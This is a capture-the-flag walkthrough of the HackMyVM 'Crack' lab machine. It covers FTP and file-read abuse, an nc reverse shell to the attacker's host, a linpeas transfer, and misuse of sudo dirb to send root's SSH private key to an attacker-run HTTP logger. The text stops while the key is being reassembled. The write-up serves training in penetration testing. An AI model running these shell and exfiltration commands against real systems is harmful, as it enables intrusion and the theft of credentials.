# CTF Penetration Testing

## HackMyVM

### Crack - Machine

#### Machine Description

- Machine name: [Crack](https://hackmyvm.eu/machines/machine.php?vm=Crack)
- Machine type: Linux VM <img src="https://hackmyvm.eu/img/linux.png" alt="Linux" width="20"/>
- Machine difficulty: 🟩 Easy

<img src="https://hackmyvm.eu/img/vm/ez.png" alt="Crack Machine Logo" width="150"/>

#### Machine Writeup

<span style="color: #e57373;"><b>Attacker { os: kali linux }</b></span>

`ifconfig`:
```
docker0: flags=4099<UP,BROADCAST,MULTICAST>  mtu 1500
        inet 172.17.0.1  netmask 255.255.0.0  broadcast 172.17.255.255
        ether 02:42:d5:98:e8:1c  txqueuelen 0  (Ethernet)
        RX packets 0  bytes 0 (0.0 B)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 0  bytes 0 (0.0 B)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

eth0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 10.0.2.15  netmask 255.255.255.0  broadcast 10.0.2.255
        ether 08:00:27:1e:36:4a  txqueuelen 1000  (Ethernet)
        RX packets 89846  bytes 133670439 (127.4 MiB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 10045  bytes 606477 (592.2 KiB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

eth1: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 192.168.56.118  netmask 255.255.255.0  broadcast 192.168.56.255 ←
        inet6 fe80::a50f:d743:435d:299a  prefixlen 64  scopeid 0x20<link>
        ether 08:00:27:9d:2e:ba  txqueuelen 1000  (Ethernet)
        RX packets 9  bytes 4816 (4.7 KiB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 29  bytes 4577 (4.4 KiB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

lo: flags=73<UP,LOOPBACK,RUNNING>  mtu 65536
        inet 127.0.0.1  netmask 255.0.0.0
        inet6 ::1  prefixlen 128  scopeid 0x10<host>
        loop  txqueuelen 1000  (Local Loopback)
        RX packets 8  bytes 480 (480.0 B)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 8  bytes 480 (480.0 B)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
```

`fping -a -g 192.168.56.0/24 2> /dev/null`:
```
192.168.56.100
192.168.56.118
192.168.56.124 ←
```

`nmap -Pn -sSV -p- -T5 192.168.56.124`:
```
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-09-24 12:28 EDT
Nmap scan report for 192.168.56.124
Host is up (0.0015s latency).
Not shown: 65532 closed tcp ports (reset)
PORT      STATE SERVICE  VERSION
21/tcp    open  ftp      vsftpd 3.0.3 ←
4200/tcp  open  ssl/http ShellInABox ←
12359/tcp open  unknown ←
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port12359-TCP:V=7.94SVN%I=7%D=9/24%Time=66F2E8BA%P=x86_64-pc-linux-gnu%
SF:r(NULL,D,"File\x20to\x20read:")%r(GenericLines,1C,"File\x20to\x20read:N
SF:OFile\x20to\x20read:");
MAC Address: 08:00:27:4F:3E:9D (Oracle VirtualBox virtual NIC)
Service Info: OS: Unix

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 37.29 seconds
```

`nmap -Pn -sSV --script=ftp-anon -p21 -T5 192.168.56.124`:
```
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-09-25 03:34 EDT
Nmap scan report for 192.168.56.124
Host is up (0.0011s latency).

PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
| ftp-anon: Anonymous FTP login allowed (FTP code 230) ←
|_drwxrwxrwx    2 0        0            4096 Jun 07  2023 upload [NSE: writeable]
MAC Address: 08:00:27:4F:3E:9D (Oracle VirtualBox virtual NIC)
Service Info: OS: Unix

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 0.61 seconds
```

<div>
	<img src="assets/logo_hacktricks.png" alt="HackTricks Logo" width="16" height="auto">
	<span style="color: red; font-size: 110%;"><strong>HackTricks</strong></span>
</div>

[Pentesting FTP](https://book.hacktricks.xyz/network-services-pentesting/pentesting-ftp)

**#Anonymous login**
_anonymous : anonymous_ _anonymous :_ _ftp : ftp_
```
ftp <IP>
>anonymous
>anonymous
>ls -a # List all files (even hidden) (yes, they could be hidden)
>binary #Set transmission to binary instead of ascii
>ascii #Set transmission to ascii instead of binary
>bye #exit
```

`ftp 192.168.56.124`:
```
Connected to 192.168.56.124.
220 (vsFTPd 3.0.3)
Name (192.168.56.124:kali): anonymous ←
331 Please specify the password.
Password: ←
230 Login successful. ←
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> dir
229 Entering Extended Passive Mode (|||33713|)
150 Here comes the directory listing.
drwxrwxrwx    2 0        0            4096 Jun 07  2023 upload ←
226 Directory send OK.
ftp> cd upload
250 Directory successfully changed.
ftp> dir
229 Entering Extended Passive Mode (|||43735|)
150 Here comes the directory listing.
-rwxr-xr-x    1 1000     1000          849 Jun 07  2023 crack.py ←
226 Directory send OK.
ftp> get crack.py
local: crack.py remote: crack.py ←
229 Entering Extended Passive Mode (|||49257|)
150 Opening BINARY mode data connection for crack.py (849 bytes).
100% |***********************************************************************************************************************************************|   849      532.49 KiB/s    00:00 ETA
226 Transfer complete.
ftp> exit
221 Goodbye.
```

`cat ./crack.py`:
```python
import os
import socket
s = socket.socket()
s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
port = 12359
s.bind(('', port))
s.listen(50)

c, addr = s.accept()
no = "NO"
while True:
        try:
                c.send('File to read:'.encode())
                data = c.recv(1024)
                file = (str(data, 'utf-8').strip())
                filename = os.path.basename(file)
                check = "/srv/ftp/upload/"+filename ←
                if os.path.isfile(check) and os.path.isfile(file): ←
                        f = open(file,"r") ←
                        lines = f.readlines()
                        lines = str(lines)
                        lines = lines.encode()
                        c.send(lines)
                else:
                        c.send(no.encode())
        except ConnectionResetError:
                pass
```

`nc 192.168.56.124 12359`:
```              
File to read:crack.py ←
['import os\n', 'import socket\n', 's = socket.socket()\n', 's.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)\n', 'port = 12359\n', "s.bind(('', port))\n", 's.listen(50)\n', '\n', 'c, addr = s.accept()\n', 'no = "NO"\n', 'while True:\n', '        try:\n', "                c.send('File to read:'.encode())\n", '                data = c.recv(1024)\n', "                file = (str(data, 'utf-8').strip())\n", '                filename = os.path.basename(file)\n', '                check = "/srv/ftp/upload/"+filename\n', '                if os.path.isfile(check) and os.path.isfile(file):\n', '                        f = open(file,"r")\n', '                        lines = f.readlines()\n', '                        lines = str(lines)\n', '                        lines = lines.encode()\n', '                        c.send(lines)\n', '                else:\n', '                        c.send(no.encode())\n', '        except ConnectionResetError:\n', '                pass\n']
```

`touch ./passwd`
`ftp 192.168.56.124`:
```
Connected to 192.168.56.124.
220 (vsFTPd 3.0.3)
Name (192.168.56.124:kali): anonymous
331 Please specify the password.
Password: 
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> dir
229 Entering Extended Passive Mode (|||38556|)
150 Here comes the directory listing.
drwxrwxrwx    2 0        0            4096 Jun 07  2023 upload
226 Directory send OK.
ftp> cd upload ←
250 Directory successfully changed.
ftp> put passwd ←
local: passwd remote: passwd
229 Entering Extended Passive Mode (|||39427|)
150 Ok to send data.
     0        0.00 KiB/s 
226 Transfer complete. ←
ftp> exit
221 Goodbye.
```

`nc 192.168.56.124 12359`:
```
File to read:/etc/passwd ←
['root:x:0:0:root:/root:/bin/bash\n', 'daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin\n', 'bin:x:2:2:bin:/bin:/usr/sbin/nologin\n', 'sys:x:3:3:sys:/dev:/usr/sbin/nologin\n', 'sync:x:4:65534:sync:/bin:/bin/sync\n', 'games:x:5:60:games:/usr/games:/usr/sbin/nologin\n', 'man:x:6:12:man:/var/cache/man:/usr/sbin/nologin\n', 'lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin\n', 'mail:x:8:8:mail:/var/mail:/usr/sbin/nologin\n', 'news:x:9:9:news:/var/spool/news:/usr/sbin/nologin\n', 'uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin\n', 'proxy:x:13:13:proxy:/bin:/usr/sbin/nologin\n', 'www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin\n', 'backup:x:34:34:backup:/var/backups:/usr/sbin/nologin\n', 'list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin\n', 'irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin\n', 'gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin\n', 'nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin\n', '_apt:x:100:65534::/nonexistent:/usr/sbin/nologin\n', 'systemd-network:x:101:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin\n', 'systemd-resolve:x:102:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin\n', 'messagebus:x:103:109::/nonexistent:/usr/sbin/nologin\n', 'systemd-timesync:x:104:110:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin\n', 'sshd:x:105:65534::/run/sshd:/usr/sbin/nologin\n', 'cris:x:1000:1000:cris,,,:/home/cris:/bin/bash\n', ← 'systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin\n', 'shellinabox:x:106:112:Shell In A Box,,,:/var/lib/shellinabox:/usr/sbin/nologin\n', 'ftp:x:107:114:ftp daemon,,,:/srv/ftp:/usr/sbin/nologin\n']
```

`nmap -Pn -sSVC -p4200 -T5 192.168.56.124`:
```
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-09-25 05:37 EDT
Nmap scan report for 192.168.56.124
Host is up (0.0014s latency).

PORT     STATE SERVICE  VERSION
4200/tcp open  ssl/http ShellInABox ←
| ssl-cert: Subject: commonName=crack
| Not valid before: 2023-06-07T10:20:13
|_Not valid after:  2043-06-02T10:20:13
|_ssl-date: TLS randomness does not represent time
|_http-title: Shell In A Box
MAC Address: 08:00:27:4F:3E:9D (Oracle VirtualBox virtual NIC)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 26.42 seconds
```

`firefox https://192.168.56.124:4200/ &`:
```
crack login: cris ←
Password: ←
Linux crack 5.10.0-23-amd64 #1 SMP Debian 5.10.179-1 (2023-05-12) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Wed Sep 25 11:42:33 CEST 2024 from 192.168.56.118 on pts/0
```
`<right-click>` > `About...`:
```
Shell In A Box 2.20 

Copyright 2008-2015 by Markus Gutschke. For more information visit
http://shellinabox.com or http://github.com/shellinabox/.

This product includes software developed by the OpenSSL Project for
use in the OpenSSL Toolkit. (http://www.openssl.org/)

This product includes cryptographic software written by Eric Young
(eay@cryptsoft.com)
```

<span style="color: #64b5f6;"><b>Victim { os: debian linux, user: <code>cris</code> }</b></span>

`whoami`:
```
cris ←
```

<span style="color: #e57373;"><b>Attacker { os: kali linux }</b></span>

`nc -lvnp 4444`:
```
listening on [any] 4444 ... ←
```

<span style="color: #64b5f6;"><b>Victim { os: debian linux, user: <code>cris</code> }</b></span>

`which bash`:
```
/usr/bin/bash ←
```
`nc -c '/usr/bin/bash' 192.168.56.118 4444`

<span style="color: #e57373;"><b>Attacker { os: kali linux }</b></span>

```
connect to [192.168.56.118] from (UNKNOWN) [192.168.56.124] 44018 ←
```

<span style="color: #64b5f6;"><b>Victim { os: debian linux, user: <code>cris</code> }</b></span>

`python3 -c 'import pty; pty.spawn("/bin/bash")' && stty raw -echo && fg; export TERM=xterm; stty rows $(tput lines) cols $(tput cols)`

`id`:
```
uid=1000(cris) gid=1000(cris) grupos=1000(cris),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),108(netdev)
```

`uname -a`:
```
Linux crack 5.10.0-23-amd64 #1 SMP Debian 5.10.179-1 (2023-05-12) x86_64 GNU/Linux
```

`lsb_release -a`:
```
Distributor ID: Debian
Description:    Debian GNU/Linux 11 (bullseye)
Release:        11
Codename:       bullseye
```

`cd /home/cris`
`ls -alps`:
```
total 44
4 drwxr-xr-x 3 cris cris 4096 jun  7  2023 ./
4 drwxr-xr-x 3 root root 4096 jun  7  2023 ../
0 lrwxrwxrwx 1 cris cris    9 jun  7  2023 .bash_history -> /dev/null
4 -rw-r--r-- 1 cris cris  220 jun  7  2023 .bash_logout
4 -rw-r--r-- 1 cris cris 3526 jun  7  2023 .bashrc
4 -rwxr-xr-x 1 cris cris  849 jun  7  2023 crack.py
4 drwxr-xr-x 3 cris cris 4096 jun  7  2023 .local/
4 -rw-r--r-- 1 cris cris  807 jun  7  2023 .profile
4 -rw-r--r-- 1 cris cris   66 jun  7  2023 .selected_editor
4 -rw------- 1 cris cris   19 jun  7  2023 user.txt ←
4 -rw------- 1 cris cris   51 jun  7  2023 .Xauthority
4 -rwxr-xr-x 1 cris cris  170 jun  7  2023 ziempre.py
```

`cat ./user.txt`:
```
eG4TUsTBxSFjTOPHMV ←
```

`cd /tmp`
`nc -lvnp 5555 > ./linpeas.sh`

<span style="color: #e57373;"><b>Attacker { os: kali linux }</b></span>

`cd /home/kali/Desktop/tools`
`ls -alps`:
```
total 10060
   4 drwxrwxr-x 2 kali kali    4096 Sep 23 09:43 ./
   4 drwxr-xr-x 8 kali kali    4096 Sep 14 10:40 ../
  56 -rw-r--r-- 1 root root   57344 Apr 11  2023 GodPotato-NET2.exe
  56 -rw-r--r-- 1 root root   57344 Apr 11  2023 GodPotato-NET35.exe
  56 -rw-r--r-- 1 root root   57344 Apr 11  2023 GodPotato-NET4.exe
2156 -rw-r--r-- 1 root root 2204117 Sep 10 10:00 Invoke-Mimikatz.ps1
 340 -rw-rw-r-- 1 kali kali  347648 Sep  9 06:17 JuicyPotato.exe
 844 -rwxr-xr-x 1 kali kali  860337 Sep 20 04:02 linpeas.sh ←
  48 -rw-rw-r-- 1 kali kali   48875 Sep 19 12:45 lse.sh
  60 -rw-r--r-- 1 root root   59392 Sep  9 13:09 nc.exe
  24 -rw-r--r-- 1 root root   22016 Dec  7  2021 PrintSpoofer32.exe
  28 -rw-r--r-- 1 root root   27136 Dec  7  2021 PrintSpoofer64.exe
2872 -rw-rw-r-- 1 kali kali 2940928 Jan 17  2023 pspy32
3032 -rwxrwxr-x 1 kali kali 3104768 Jan 17  2023 pspy64
  52 -rw-r--r-- 1 root root   51712 May 20  2023 RunasCs.exe
  60 -rw-r--r-- 1 root root   61440 May 17  2023 RunasCs_net2.exe
 368 -rw-rw-r-- 1 kali kali  375176 Sep 23 09:43 socat
```
`cat linpeas.sh | nc 192.168.56.124 5555`

<span style="color: #64b5f6;"><b>Victim { os: debian linux, user: <code>cris</code> }</b></span>

`ls -alps`:
```
total 880
  4 drwxrwxrwt  9 root root   4096 sep 25 11:55 ./
  4 drwxr-xr-x 18 root root   4096 jun  7  2023 ../
  4 drwxrwxrwt  2 root root   4096 sep 25 09:23 .font-unix/
  4 drwxrwxrwt  2 root root   4096 sep 25 09:23 .ICE-unix/
844 -rw-r--r--  1 cris cris 860337 sep 25 11:55 linpeas.sh ←
  4 drwx------  3 root root   4096 sep 25 09:23 systemd-private-e755993c842f40b9b34504365c0f69d2-systemd-logind.service-L0hjij/
  4 drwx------  3 root root   4096 sep 25 09:23 systemd-private-e755993c842f40b9b34504365c0f69d2-systemd-timesyncd.service-wNlwWe/
  4 drwxrwxrwt  2 root root   4096 sep 25 09:23 .Test-unix/
  4 drwxrwxrwt  2 root root   4096 sep 25 09:23 .X11-unix/
  4 drwxrwxrwt  2 root root   4096 sep 25 09:23 .XIM-unix/
```

`chmod +x ./linpeas.sh`
`./linpeas.sh > ./linpeas_output.txt`
`cat ./linpeas_output.txt`:
```
[...]

╔══════════╣ Active Ports
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#open-ports                                                   
tcp   LISTEN 0      128        127.0.0.1:22 ←       0.0.0.0:*        
tcp   LISTEN 0      50           0.0.0.0:12359      0.0.0.0:*    users:(("python3",pid=666,fd=3))
tcp   LISTEN 0      128          0.0.0.0:4200       0.0.0.0:*                      
tcp   LISTEN 0      32                 *:21               *:*                             
[...]

╔══════════╣ Checking 'sudo -l', /etc/sudoers, and /etc/sudoers.d
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#sudo-and-suid                                                                        
Matching Defaults entries for cris on crack:                                                                                              
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User cris may run the following commands on crack:
    (ALL) NOPASSWD: /usr/bin/dirb ←

[...]

╔══════════╣ Searching ssl/ssh files
╔══════════╣ Analyzing SSH Files (limit 70)

-rw-r--r-- 1 root root 172 jun  7  2023 /etc/ssh/ssh_host_ecdsa_key.pub
-rw-r--r-- 1 root root 92 jun  7  2023 /etc/ssh/ssh_host_ed25519_key.pub
-rw-r--r-- 1 root root 564 jun  7  2023 /etc/ssh/ssh_host_rsa_key.pub

[...]
```

<span style="color: #e57373;"><b>Attacker { os: kali linux }</b></span>

`mkdir http_server_logger`
`cd ./http_server_logger`
`vim ./http_server_logger.py`:
```python
#!/usr/bin/python3

import http.server
import socketserver
import logging

# Port to expose
PORT = 8888

# Name of the log file
log_file = "get_requests.log"

# Configure logging to write GET requests into the file
logging.basicConfig(filename=log_file, level=logging.INFO, format='%(asctime)s - %(message)s')

class CustomHandler(http.server.SimpleHTTPRequestHandler):
    def do_GET(self):
        # Write details of the GET request into the log file
        if len(self.path) != 70:
            self.path = self.path[1:]
        logging.info(f"Received GET request: Path={self.path}, Client={self.client_address[0]}")
        
        # Respond with a 200 status and a confirmation message
        self.send_response(200)
        self.send_header("Content-type", "text/html")
        self.end_headers()
        self.wfile.write(b"GET request received and logged.") # Change this response as needed

# Set up the server on PORT with the custom handler
with socketserver.TCPServer(("", PORT), CustomHandler) as httpd:
    print(f"Serving on port {PORT}...")
    try:
	    httpd.serve_forever()
    except KeyboardInterrupt:  
        print('Stopping server...')  
        httpd.server_close()
```
`chmod +x ./http_server_logger.py`
`./http_server_logger.py`:
```
Serving on port 8888... ←
```

<span style="color: #64b5f6;"><b>Victim { os: debian linux, user: <code>cris</code> }</b></span>

`sudo /usr/bin/dirb http://192.168.56.118:8888 /root/.ssh/id_rsa`:
```
-----------------
DIRB v2.22    
By The Dark Raver
-----------------

START_TIME: Wed Sep 25 13:42:36 2024
URL_BASE: http://192.168.56.118:8888/
WORDLIST_FILES: /root/.ssh/id_rsa ←

-----------------

GENERATED WORDS: 38                                                            

---- Scanning URL: http://192.168.56.118:8888/ ----
                                                                               yCgecd/rIJQ+tGPXoqXIKrf5lVrVtFC
-----------------
END_TIME: Wed Sep 25 13:42:36 2024
DOWNLOADED: 38 - FOUND: 0
```

<span style="color: #e57373;"><b>Attacker { os: kali linux }</b></span>

```
192.168.56.124 - - [25/Sep/2024 07:49:23] "GET /randomfile1 HTTP/1.1" 200 -
192.168.56.124 - - [25/Sep/2024 07:49:23] "GET /frand2 HTTP/1.1" 200 -
192.168.56.124 - - [25/Sep/2024 07:49:23] "GET /-----BEGIN HTTP/1.1" 200 -
192.168.56.124 - - [25/Sep/2024 07:49:23] "GET /b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn HTTP/1.1" 200 -
192.168.56.124 - - [25/Sep/2024 07:49:23] "GET /NhAAAAAwEAAQAAAYEAxBvRe3EH67y9jIt2rwa79tvPDwmb2WmYv8czPn4bgSCpFmhDyHwn HTTP/1.1" 200 -
192.168.56.124 - - [25/Sep/2024 07:49:23] "GET /b0IUyyw3iPQ3LlTYyz7qEc2vaj1xqlDgtafvvtJ2EJAJCFy5osyaqbYKgAkGkQMzOevdGt HTTP/1.1" 200 -

[...]

192.168.56.124 - - [25/Sep/2024 07:49:23] "GET /oxY6YRERurpcyYuSa/rxIP2uxu1yjIIcO4hpsQaoipTM0T9PS56CrO+FN9mcIcXCj5SVEq HTTP/1.1" 200 -
192.168.56.124 - - [25/Sep/2024 07:49:23] "GET /2UVzu9LS0PdqPmniNmWglwvAbkktcEmbmCLYoh5GBxm9VhcL69dhzMdVe73Z9QhNXnMDlf HTTP/1.1" 200 -
192.168.56.124 - - [25/Sep/2024 07:49:23] "GET /6xpD9lHWyp+ocD/meYC7V8aio/W9VxL25NlYwdFyCgecd/rIJQ+tGPXoqXIKrf5lVrVtFC HTTP/1.1" 200 -
192.168.56.124 - - [25/Sep/2024 07:49:23] "GET /s8IoeeQHSidUKBAAAACnJvb3RAY3JhY2s= HTTP/1.1" 200 -
192.168.56.124 - - [25/Sep/2024 07:49:23] "GET /-----END HTTP/1.1" 200 -
```
`echo 'b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn' | wc -m`:
```
71
```

`ls -alps ./`:
```
total 20
4 drwxrwxr-x 2 kali kali 4096 Sep 25 07:48 ./
4 drwxrwxr-x 3 kali kali 4096 Sep 25 07:39 ../
8 -rw-rw-r-- 1 kali kali 5637 Sep 25 07:49 get_requests.log ←
4 -rwxrwxr-x 1 kali kali  995 Sep 25 07:48 http_server_logger.py
```

`cat get_requests.log`:
```
2024-09-25 08:48:48,166 - Received GET request: Path=randomfile1, Client=127.0.0.1
2024-09-25 08:48:48,168 - Received GET request: Path=frand2, Client=127.0.0.1
2024-09-25 08:48:48,174 - Received GET request: Path=-----BEGIN, Client=127.0.0.1
2024-09-25 08:48:48,174 - Received GET request: Path=b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn, Client=127.0.0.1
2024-09-25 08:48:48,175 - Received GET request: Path=NhAAAAAwEAAQAAAYEAxHQxlL4x8UOlzyKNM9bLbeej08oTcadawisEYQjSECtSHQezHcTP, Client=127.0.0.1
2024-09-25 08:48:48,176 - Received GET request: Path=FN2rOFY3TES+XVSrvrNygxQNaNjbHfbIZJRXAqKaXBnudbmPdKoOjC55Sj0vf7lgx1CXrx, Client=127.0.0.1

[...]

2024-09-25 08:48:48,197 - Received GET request: Path=yvbdQ2BR8GzT1Bl106vrq1Y4tzGQUQQvVcDXciJ8dAr3hgeH7dkzYOqErIcin9y3RoAnqz, Client=127.0.0.1
2024-09-25 08:48:48,198 - Received GET request: Path=qpcdkERV7Lf10xprUYaGGaG5uvSbLQznAljYQJZuWffGGwOx+q+MQyCw400MpPFl/2/QWF, Client=127.0.0.1
2024-09-25 08:48:48,199 - Received GET request: Path=vqQ1itrPQzeMUNAAAADGthbGlAa2FsaS12bQECAwQFBg==, Client=127.0.0.1
2024-09-25 08:48:48,199 - Received GET request: Path=/-----END, Client=127.0.0.1
```

`cat get_requests.log | cut -d'=' -f2 | cut -d',' -f1`:
```
randomfile1
frand2
-----BEGIN
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn
NhAAAAAwEAAQAAAYEAxBvRe3EH67y9jIt2rwa79tvPDwmb2WmYv8czPn4bgSCpFmhDyHwn
b0IUyyw3iPQ3LlTYyz7qEc2vaj1xqlDgtafvvtJ2EJAJCFy5osyaqbYKgAkGkQMzOevdGt
xNQ8NxRO4/bC1v90lUrhyLi/ML5B4nak+5vLFJi8NlwXMQJ/xCWZg5+WOLduFp4VvHlwAf
tDh2C+tJp2hqusW1jZRqSXspCfKLPt/v7utpDTKtofxFvSS55MFciju4dIaZLZUmiqoD4k
/+FwJbMna8iPwmvK6n/2bOsE1+nyKbkbvDG5pjQ3VBtK23BVnlxU4frFrbicU+VtkClfMu
yp7muWGA1ydvYUruoOiaURYupzuxw25Rao0Sb8nW1qDBYH3BETPCypezQXE22ZYAj0ThSl
Kn2aZN/8xWAB+/t96TcXogtSbQw/eyp9ecmXUpq5i1kBbFyJhAJs7x37WM3/Cb34a/6v8c
9rMjGl9HMZFDwswzAGrvPOeroVB/TpZ+UBNGE1znAAAFgC5UADIuVAAyAAAAB3NzaC1yc2
EAAAGBAMQb0XtxB+u8vYyLdq8Gu/bbzw8Jm9lpmL/HMz5+G4EgqRZoQ8h8J29CFMssN4j0
Ny5U2Ms+6hHNr2o9capQ4LWn777SdhCQCQhcuaLMmqm2CoAJBpEDMznr3RrcTUPDcUTuP2
wtb/dJVK4ci4vzC+QeJ2pPubyxSYvDZcFzECf8QlmYOflji3bhaeFbx5cAH7Q4dgvrSado
arrFtY2Uakl7KQnyiz7f7+7raQ0yraH8Rb0kueTBXIo7uHSGmS2VJoqqA+JP/hcCWzJ2vI
j8Jryup/9mzrBNfp8im5G7wxuaY0N1QbSttwVZ5cVOH6xa24nFPlbZApXzLsqe5rlhgNcn
b2FK7qDomlEWLqc7scNuUWqNEm/J1tagwWB9wREzwsqXs0FxNtmWAI9E4UpSp9mmTf/MVg
Afv7fek3F6ILUm0MP3sqfXnJl1KauYtZAWxciYQCbO8d+1jN/wm9+Gv+r/HPazIxpfRzGR
Q8LMMwBq7zznq6FQf06WflATRhNc5wAAAAMBAAEAAAGAeX9uopbdvGx71wZUqo12iLOYLg
3a87DbhP2KPw5sRe0RNSO10xEwcVq0fUfQxFXhlh/VDN7Wr98J7b1RnZ5sCb+Y5lWH9iz2
m6qvDDDNJZX2HWr6GX+tDhaWLt0MNY5xr64XtxLTipZxE0n2Hueel18jNldckI4aLbAKa/
a4rL058j5AtMS6lBWFvqxZFLFr8wEECdBlGoWzkjGJkMTBsPLP8yzEnlipUxGgTR/3uSMN
peiKDzLI/Y+QcQku/7GmUIV4ugP0fjMnz/XcXqe6GVNX/gvNeT6WfKPCzcaXiF4I2i228u
TB9Ga5PNU2nYzJAQcAVvDwwC4IiNsDTdQY+cSOJ0KCcs2cq59EaOoZHY6Od88900V3MKFG
TwielzW1Nqq1ltaQYMtnILxzEeXJFp6LlqFTF4Phf/yUyK04a6mhFg3kJzsxE+iDOVH28D
Unj2OgO53KJ2FdLBHkUDlXMaDsISuizi0aj2MnhCryfHefhIsi1JdFyMhVuXCzNGUBAAAA
wQDlr9NWE6q1BovNNobebvw44NdBRQE/1nesegFqlVdtKM61gHYWJotvLV79rjjRfjnGHo
0MoSXZXiC/0/CSfe6Je7unnIzhiA85jSe/u2dIviqItTc2CBRtOZl7Vrflt7lasT7J1WAO
1ROwaN5uL26gIgtf/Y7Rhi0wFPN289UI2gjeVQKhXBObVm3qY7yZh8JpLPH5w0Xeuo20sP
WchZl0D8KSZUKhlPU6Pibqmj9bAAm7hwFecuQMeS+nxg1qIGYAAADBAOZ1XurOyyH9RWIo
0sTQ3d/kJNgTNHAs4Y0SxSOejC+N3tEU33GU3P+ppfHYy595rX7MX4o3gqXFpAaHRIAupr
DbenB1HQW4o6Gg+SF2GWPAQeuDbCsLM9P8XOiQIjTuCvYwHUdFD7nWMJ5Sqr6EeBV+CYw1
Tg5PIU3FsnN5D3QOHVpGNo2qAvi+4CD0BC5fxOs6cZ1RBqbJ1kanw1H6fF8nRRBds+26Bl
/RGZHTBPLVenhNmWN2fje3GDBqVeIbZwAAAMEA2dfdjpefYEgtF0GMC9Sf5UzKIEKQMzoh
oxY6YRERurpcyYuSa/rxIP2uxu1yjIIcO4hpsQaoipTM0T9PS56CrO+FN9mcIcXCj5SVEq
2UVzu9LS0PdqPmniNmWglwvAbkktcEmbmCLYoh5GBxm9VhcL69dhzMdVe73Z9QhNXnMDlf
6xpD9lHWyp+ocD/meYC7V8aio/W9VxL25NlYwdFyCgecd/rIJQ+tGPXoqXIKrf5lVrVtFC
s8IoeeQHSidUKBAAAACnJvb3RAY3JhY2s=
-----END
```

`vim ./id_rsa`:
```
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn
NhAAAAAwEAAQAAAYEAxBvRe3EH67y9jIt2rwa79tvPDwmb2WmYv8czPn4bgSCpFmhDyHwn
b0IUyyw3iPQ3LlTYyz7qEc2vaj1xqlDgtafvvtJ2EJAJCFy5osyaqbYKgAkGkQMzOevdGt
xNQ8NxRO4/bC1v90lUrhyLi/ML5B4nak+5vLFJi8NlwXMQJ/xCWZg5+WOLduFp4VvHlwAf
tDh2C+tJp2hqusW1jZRqSXspCfKLPt/v7utpDTKtofxFvSS55MFciju4dIaZLZUmiqoD4k
/+FwJbMna8iPwmvK6n/2bOsE1+nyKbkbvDG5pjQ3VBtK23BVnlxU4frFrbicU+VtkClfMu
yp7muWGA1ydvYUruoOiaURYupzuxw25Rao0Sb8nW1qDBYH3BETPCypezQXE22ZYAj0ThSl
Kn2aZN/8xWAB+/t96TcXogtSbQw/eyp9ecmXUpq5i1kBbFyJhAJs7x37WM3/Cb34a/6v8c
9rMjGl9HMZFDwswzAGrvPOeroVB/TpZ+UBNGE1znAAAFgC5UADIuVAAyAAAAB3NzaC1yc2
EAAAGBAMQb0XtxB+u8vYyLdq8Gu/bbzw8Jm9lpmL/HMz5+G4EgqRZoQ8h8J29CFMssN4j0
Ny5U2Ms+6hHNr2o9capQ4LWn777SdhCQCQhcuaLMmqm2CoAJBpEDMznr3RrcTUPDcUTuP2
